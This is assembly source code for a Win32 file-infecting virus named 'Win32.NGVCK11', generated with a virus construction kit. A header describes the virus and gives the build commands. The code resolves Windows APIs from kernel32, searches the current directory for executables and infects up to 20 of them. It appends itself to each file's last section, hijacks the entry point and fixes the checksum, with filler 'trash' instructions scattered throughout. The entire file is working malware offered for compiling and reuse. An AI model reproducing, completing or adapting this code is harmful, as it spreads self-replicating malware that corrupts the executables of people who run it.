              
;
;
; Win32.NGVCK11 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK11
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 34
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
                                        ; we add some nop's to make the offsets
                                        ; more variable, these nops will not be copied
                                        ; with the virus !
 db 68451 dup(90h)
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 mov ebx, dword ptr [esp]
                                        ; add esp, 4
 add esp, 4d
 sub ebx, offset Delta
                                        ; mov ebp, ebx
 push ebx
 pop ebp
 jmp KernelSearchStart


;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea ebx, [ebp+WFD_szFileName]
 xchg ebx, esi

                                        ; mov eax, 276
 mov eax, ( 276d - 8d )
 add eax, 8d

ClearOldData2:
 mov byte ptr [esi], 0h
                                        ; add esi, 1
 add esi, 1d
 dec eax
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea esi, [ebp+WIN32_FIND_DATA]
 xchg eax, esi

 push eax
 push ebx
 call dword ptr [ebp+XFindFirstFileA]
 not ecx                                ; Trash
 mov dword ptr [ebp+FindHandle], 0
 xor dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov eax, ebp
 add eax, offset WIN32_FIND_DATA

 push eax
 mov ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret





;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ebx

 mov eax, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], eax



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 sub ebp, 1
 inc ebp
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retEIP dd 0h
 add edx,12345678h
 org $-4
 retBase dd 0h
 jmp edx



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edx Lenght of API-Name
                                        ; eax Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 mov ebx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push ebx
 mov ecx, dword ptr [ebx]
 add ecx, [ebp+KernelMZ]
                                        ; mov ebx, ecx
                                        ; clear ebx
 push 0
 pop ebx
 add ebx, ecx
 mov dword ptr [ebp+Trash1], ebx        ; Trash
                                        ; mov edi, ecx
                                        ; clear edi
 mov edi, 23842d
 sub edi, 23842d
 add edi, ecx
 mov dword ptr [ebp+TempApisearch1], edx
 mov dword ptr [ebp+TempApisearch2], edi
 push eax
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; eax Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov ch, byte ptr [eax]
 cmp ch, byte ptr [edi]
 jne ApiNotFound
 add edx, -1
 dec edx
 inc edx
 jz FoundApi1
                                        ; add edi, 1
 sub edi, -1d
                                        ; add eax, 1
 sub eax, -1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop eax
 pop ebx
 mov edx, dword ptr [ebp+TempApisearch1]
 mov edi, dword ptr [ebp+TempApisearch2]
                                        ; add ebx, 4
 add ebx, 4d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1
 xor ecx, ecx                           ; Trash

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop eax
 pop ebx
 rol ebx, 24d                           ; Trash
                                        ; retrieve the offset
                                        ; clear ecx
 push 0
 pop ecx
 mov cx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal ecx, 1                             ; multiply with 2
 xor dword ptr [ebp+Trash1], 925        ; Trash
 add ecx, dword ptr [ebp+OTableVA]
 xchg ecx, esi
 movzx ecx, word ptr [esi]
 shl ecx, 2h
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [ecx]
 add ebx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ecx
 popad
 jmp ExecuteHost



;        [ ///// * Retrieve non Kernel API's * \\\\\ ]

GetOtherApis:
 push ecx 
 push edx 
 push ebx
 call dword ptr [ebp+XLoadLibraryA]
 inc eax                                ; Trash
 pop edx 
 pop ecx 
                                        ; mov ebx, eax
 mov ebx, eax
GetOtherApiLoop:
 push ecx 
 push edx 
 push ecx
 push ebx
 call dword ptr [ebp+XGetProcAddress]
 pop edx 
 pop ecx 
 mov dword ptr [edi], eax
 sub eax, ecx                           ; Trash
                                        ; add edi, 4
 add edi, 4d
 sub edx, 1
 test edx, edx
 jz GetOtherApiEnd
GetOtherApiLoop2:
                                        ; add ecx, 1
 add ecx, 1d
 cmp byte ptr [ecx], 0
 jne GetOtherApiLoop2
                                        ; add ecx, 1
 inc ecx
 jmp GetOtherApiLoop
GetOtherApiEnd:
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, 0
 div ebx
                                        ; add eax, 1
 inc eax
 mul ebx
 xor dword ptr [ebp+Trash1], ebx        ; Trash
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

 and dword ptr [ebp+Trash1], ecx        ; Trash
KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov eax, dword ptr [esp]
                                        ; round to pages
 shr eax, 16d
 shl eax, 16d
                                        ; add eax, 1
 add eax, 1d
GetKernelLoop:
                                        ; clear ebx
 push 0
 pop ebx
 sub eax, 1
 mov bx, word ptr [eax+03ch]
 cmp bx,0f800h
 je GetKernelLoop
 cmp eax, dword ptr [eax+ebx+34h]
 jnz GetKernelLoop
 push eax
 pop dword ptr [ebp+KernelMZ]
 mov ecx, eax
 add ecx, [eax+3Ch]
 mov [KernelPE+ebp], ecx

 mov ebx, offset GetApis
 add ebx, ebp

 push ebx
ret

;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov ebx, 80000000h or 40000000h
 push ebx
 mov ebx, ebp
 add ebx, offset WFD_szFileName

 push ebx
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 sub eax, 1

 push eax
 pop dword ptr [ebp+FileHandle]

CreateMap:                              ; Map the file
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx

                                        ; clear edx
 sub edx, edx
 push edx
 push ecx
 push edx
 push 00000004h
 push edx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ecx
 or eax, eax
 jz CloseFile
 push ecx
 push 0
 push 0
                                        ; mov ebx, 2
 mov ebx, 0
 add ebx, 2d
 push ebx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
                                        ; add eax, 1
 inc eax
 dec eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldEIP]
 pop esi

 mov dword ptr [ebp+retEIP], esi
 ror edx, 4d                            ; Trash

 mov esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], esi




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov [ebp+InfCounter], 20d
 mov ebx, ebp
 add ebx, offset filemask

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 inc eax
 sub eax, 1
 add eax, 1
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, ecx
 add esi, [ecx+3Ch]
                                        ; get File Alignment
                                        ; add esi, 60
 inc esi
 add esi, 59d
 mov edx, [esi]
 dec esi
 sub esi, 59d
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], edx
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], ecx
 call Align
                                        ; clear ecx
 sub ecx, ecx
 add ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 add dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
 shl eax, 17d                           ; Trash
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov eax, dword ptr [esi+3Ch]
 add eax, esi
                                        ; infect by increasing the last section
                                        ; clear esi
 xor esi, esi
 add esi, eax
                                        ; get last section
                                        ; clear ecx
 mov ecx, 0
 mov cx, word ptr [esi+06h]
 sub ecx, 1
 imul ecx, ecx, 28h
 add eax, ecx
                                        ; add eax, 120
 dec eax
 add eax, 121d
 mov ebx, dword ptr [esi+74h]
 xor edx, 81106481d                     ; Trash
 sal ebx, 3
 add eax, ebx
                                        ; get old Entrypoint
 mov edx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], -1
 and dword ptr [ebp+OldEIP], edx
 mov ebx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], -1
 and dword ptr [ebp+OldBase], ebx
                                        ; clear ecx
 and ecx, 0

 add ecx, [eax+10h]
                                        ; mov edx, ecx
                                        ; clear edx
 mov edx, 0
 add edx, ecx
 add eax, 14h
 add ecx, [eax]
 sub eax, 14h
 push ecx
 push edx
 pop ebx
 add eax, 0Ch
 add ebx, [eax]
 sub eax, 0Ch
 push ebx
 pop dword ptr [ebp+NewEIP]
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], ebx
 mov ebx, [eax+10h]
 push ebx
                                        ; calculate new section size
 push dword ptr [esi+3Ch]
 add ebx, VirusSize
 pop dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignReg1], ebx
 call Align
                                        ; mov ebx, -1
 mov ebx, ( -1d + 4d )
 sub ebx, 4d
 and ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [eax+10h], 0h
 add dword ptr [eax+10h], ebx
 pop ebx
 add ebx,  (VirusSize-1803d)
 add ebx, 1803d
 mov dword ptr [eax+08h], ebx
 mov ebx, dword ptr [eax+10h]
 add ebx, dword ptr [eax+0Ch]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], ebx
                                        ; set write, read and code flag
 or dword ptr [eax+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 mov eax, VirusSize
 lea ecx, [ebp+Virus]
 xchg ecx, esi

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec eax
 jnz AppendLoop
 cmp dword ptr [ebp+XCheckSumMappedFile], -1d
 je NoCheckSum
 mov edx, offset CheckSum
 add edx, ebp

 push edx
 mov ebx, offset HeaderSum
 add ebx, ebp

 push ebx
 mov ebx, dword ptr [ebp+NewSize]
 push ebx
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XCheckSumMappedFile]
 mov ecx, dword ptr [ebp+MapAddress]
 rol edx, 8d                            ; Trash
 mov ecx, [ecx+3Ch]
 add ecx, dword ptr [ebp+MapAddress]
                                        ; mov edx, -1
 mov edx, -1d
 and edx, dword ptr [ebp+CheckSum]
 mov dword ptr [ecx+58h], edx
NoCheckSum:
                                        ; decrease Infection Counter
 mov ebx, dword ptr [ebp+InfCounter]
 dec ebx
 push ebx
 pop dword ptr [ebp+InfCounter]
 clc
ret

NoEXE:
 stc
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 TempApisearch2 dd 0h

 APINames:
 db 14d, 'FindFirstFileA'
 db 11d, 'CloseHandle'
 db 18d, 'CreateFileMappingA'
 db 13d, 'MapViewOfFile'
 db 11d, 'CreateFileA'
 db 09d, 'FindClose'
 db 12d, 'LoadLibraryA'
 db 14d, 'GetProcAddress'
 db 15d, 'UnmapViewOfFile'
 db 13d, 'FindNextFileA'

 HeaderSum dd 0h
 NTableVA    dd 0h
 NewEIP      dd 0h
 KernelMZ    dd 0h
 ATableVA    dd 0h
 TempAPI     dd 0h
 OTableVA    dd 0h
 NewSize     dd 0h
 CheckSumMFA db 'CheckSumMappedFile',0
 AlignReg1   dd 0h
 OldBase     dd 400000h
 filemask    db '*.exE',0
 CheckSum dd 0h
 counter     dw 0h
 KernelPE    dd 0h
 Imagehlp    db 'imagehlp.dll',0
 AlignReg2   dd 0h
 db 'Win32.NGVCK11 - SnakeByte',0
 OldEIP      dd 0h
 XCheckSumMappedFile    dd 0h
 MapHandle   dd 0h
 MapAddress  dd 0h

 APIOffsets:
 XFindFirstFileA        dd 0h
 XCloseHandle           dd 0h
 XCreateFileMappingA    dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileA           dd 0h
 XFindClose             dd 0h
 XLoadLibraryA          dd 0h
 XGetProcAddress        dd 0h
 XUnmapViewOfFile       dd 0h
 XFindNextFileA         dd 0h

 InfCounter  dd 0h
 FindHandle  dd 0h
 TempApisearch1 dd 0h
 FileHandle  dd 0h
 Trash1      dd 0h




;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov edx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [edx], 'ZM'
 je Goodfile
                                        ; clear ecx
 mov ecx, -28182d
 add ecx, 28182d
 or ecx, ecx
 jz Notagoodfile

Goodfile:
                                        ; clear ecx
 mov ecx, -33269d
 add ecx, 33269d
 mov cx, word ptr [edx+3Ch]
 dec ecx
 inc ecx
 jz Notagoodfile
 push dword ptr [edx+3Ch]
 pop ecx
                                        ; check if header lies inside the file
 cmp ecx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add ecx, edx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [ecx], 'EP'
 je Goodfile2
                                        ; clear ebx
 mov ebx, 0
 sub ebx, 1
 add ebx, 1
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ecx+4Ch], 'NGVC'
 jz Notagoodfile
                                        ; check for OBJ
 mov ax, word ptr [ecx+16h]
 and ax, 00002h
 cmp ax, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 rol ebx, 15d                           ; Trash
 pop ecx
                                        ; clear edx
 xor edx, edx
 add edx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear esi
 and esi, 0
 add esi, [edx+78h]
 add esi, [ebp+KernelMZ]
                                        ; add esi, 28
 dec esi
 add esi, 29d
                                        ; get ATableVA
 mov edx, dword ptr [esi]
                                        ; add esi, 4
 add esi, 4d
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], edx
                                        ; get NTableVA
 mov edx, dword ptr [esi]
 add edx, [ebp+KernelMZ]
                                        ; add esi, 4
 dec esi
 add esi, 5d
 mov dword ptr [ebp+NTableVA], edx
                                        ; get OTableVA
 mov edx, dword ptr [esi]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edx
                                        ; load API Names and Offsets
 mov eax, offset APINames
 add eax, ebp

 lea edx, [ebp+APIOffsets]
 xchg edx, edi


GetApisLoop: 
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

                                        ; clear edx
 xor edx, edx
 mov dl, byte ptr [eax]
                                        ; add eax, 1
 add eax, 1d

                                        ; search 'em
                                        ; edx contains Name-Lenght
                                        ; eax points to the Name
                                        ; edi points to the offset

 call SearchAPI1
 push eax
 add dword ptr [esp], edx
 pop eax
 push dword ptr [ebp+TempAPI]
 pop ebx
 mov dword ptr [edi], ebx
                                        ; add edi, 4
 dec edi
 add edi, 5d
 loop GetApisLoop
 lea eax, [ebp+XCheckSumMappedFile]
 xchg edi, eax

 lea ebx, [ebp+Imagehlp]

 lea esi, [ebp+CheckSumMFA]
 xchg ecx, esi

                                        ; mov edx, 1
 mov edx, ( 1d xor 38d )
 xor edx, 38d
 call GetOtherApis
 jmp Outbreak



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

